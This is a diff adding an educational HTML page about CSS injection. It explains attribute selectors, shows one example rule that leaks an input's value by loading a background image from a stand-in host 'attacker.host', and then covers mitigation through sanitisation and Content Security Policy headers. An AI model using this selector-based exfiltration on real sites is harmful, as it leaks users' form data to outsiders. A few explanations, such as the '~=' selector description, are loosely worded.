@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CSS Injection</title>
+    <style>
+      body {
+        margin: 20px;
+        font-size: 1.25rem;
+        line-height: 1.7rem;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>CSS Injection</h1>
+    <p>
+      CSS (Cascading Stylesheet language) is the specification for webpage
+      styling supported by web browsers. The elements of a website can be styled
+      using the properties set by an external stylesheet. At runtime, the page
+      can introspect itself to see the styles applied. CSS has grown over time
+      and became gradually complex. CSS injection happens when an attacker is
+      able to place his own CSS code into a vulnerable website. This kind of
+      vulnerability happens when the application permits the user-generated CSS
+      or it is possible to interfere with the stylesheets in some way. The main
+      impacts of CSS Injection: Cross-Site Scripting in specific conditions, UI
+      modifications, and data exfiltration by taking out sensitive data. CSS
+      language provides different value selectors as shown below for selecting
+      the elements based on the value of an attribute
+    </p>
+    <p style="background-color: rgb(238, 206, 206); color: rgb(63, 122, 233)">
+      <kbd>
+        [attribute =value]: [username=abc]  - Selects all elements with
+        username="abc" [attribute ^=value]:[username ^=abc] - Select all
+        elements with username attribute value starting with "abc" [attribute
+        $=value]:[username $=abc] - Select all elements with username attribute
+        value ending with "abc" [attribute ~=value]:[username ~=abc] - Select
+        all elements with username attribute containing the value "abc"</kbd
+      >
+    </p>
+    <br />
+    <p>
+      Consider the below code snippet to understand how attackers can misuse
+      these selectors.
+    </p>
+    <p style="background-color: rgb(238, 206, 206)">
+      <kbd>
+        &lt;style&gt;     #username[value="john"] {            
+        background:url("https://attacker.host/john");     } &lt;/style&gt;
+        <input id="username" value="john" />
+      </kbd>
+    </p>
+    <h3>CSS Injection Mitigation</h3>
+    <p>
+      Most modern browsers provide restrictions for different kinds of CSS
+      injection that happened in the past. The CSS Injection vulnerability can
+      be mitigated by following the best practice steps.
+    </p>
+    <ul>
+      <li>
+        Scan the application with a web application security scanner, which can
+        easily detect this vulnerability.
+      </li>
+      <li>Do proper content sanitization.</li>
+      <li>
+        Implement proper Content Security Policy (CSP) header which can restrict
+        from where stylesheets are allowed to be loaded.
+      </li>
+    </ul>
+    <h3>Content Security Policy(CSP)</h3>
+    <p>
+      It can be defined as a standard to mitigate and detect numerous content
+      injection attacks. It provides different directives that are used to limit
+      how and from where content can be loaded into a web application. A browser
+      that is compatible with CSP will execute only the scripts mentioned in the
+      allowed list of domains. A website can be protected from a cross-site
+      scripting attack by properly setting the Content Security Policy. To
+      configure Content Security Policy, we need to set the
+      "Content-Security-Policy" response header or in the "<meta />" tag of
+      HTML. Set the values to control the resources that the browser is allowed
+      to load for that particular page. The policy can be specified as shown
+      below:
+    </p>
+    <kbd>Content-Security-Policy: policy </kbd>
+    <p>
+      The policy can be set using different directives that define the policy
+      for a certain resource type. The directive “default-src” is to be set and
+      it acts as a fallback for other resource types when they don't have
+      policies of their own. The directives default-src or script-src is to be
+      mentioned in the policy to prevent the execution of inline scripts. The
+      directives default-src or style-src is to be set to restrict inline styles
+      from being executed from an &lt;style&gt; element or a style attribute.
+      Consider the below policy:
+      <kbd>Content-Security-Policy: default-src 'self' </kbd>
+    </p>
+    <p>
+      If the value of the "default-src" directive is set to "self" then it
+      indicates that only the sources that come from the original domain are
+      allowed.
+      <kbd>Content-Security-Policy: script-src https://example.com/; </kbd>
+    </p>
+    <p>
+      If the value of the "script-src" directive is set to a particular URL then
+      it indicates that only the scripts from the specified sources are allowed.
+      <kbd>Content-Security-Policy: style-src https://example.com/; </kbd>
+    </p>
+    <p>
+      If the value of the "style-src" directive is set to a particular URL then
+      indicates only the stylesheets from the specified sources are allowed.
+      Consider the below code snippet to understand how to mitigate CSS
+      Injection attacks by setting the CSP header.
+    </p>
+    <p style="background-color: rgb(238, 206, 206)">
+      <kbd>
+        &lt;head&gt;
+        <br />
+        &lt;meta charset="UTF-8" /&gt;
+        <br />
+        &lt;meta http-equiv="Content-Security-Policy" content="style-src 'self'"
+        /&gt;
+        <br />
+        &lt;link rel="stylesheet" href="style.css" /&gt;
+        <br />
+        &lt;title&gt;Title Description&lt;/title&gt; <br />&lt;/head&gt;</kbd
+      >
+    </p>
+    <p>
+      Adding the above restriction as "style-src" attribute to self' indicates
+      that the CSS code can be injected only if the request is from the origin
+      from which the document is being served. It is recommended to set the CSP
+      directives in the response header at the server configuration level as it
+      handles the entire application.
+    </p>
+  </body>
+</html>
